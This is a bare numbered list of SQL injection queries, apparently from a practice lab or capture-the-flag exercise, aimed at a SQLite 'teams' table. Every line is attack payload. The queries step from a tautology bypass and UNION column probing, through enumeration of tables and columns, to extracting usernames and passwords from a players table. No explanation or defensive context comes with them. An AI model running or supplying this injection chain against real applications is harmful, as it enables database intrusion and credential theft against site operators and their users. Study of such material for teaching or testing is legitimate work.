SELECT id, name, points FROM teams WHERE name = '1' or 1=1 -- 0
SELECT id, name, points FROM teams WHERE name = '1' UNION SELECT null, null, null -- 1
SELECT id, name, points FROM teams WHERE name = '1' UNION SELECT 1, name, 2 FROM sqlite_master WHERE type='table' -- 2
SELECT id, name, points FROM teams WHERE name = '1' UNION SELECT 1, name, 2 FROM pragma_table_info('players') -- 3
SELECT id, name, points FROM teams WHERE name = '1' UNION SELECT username, password, teamID FROM players -- 4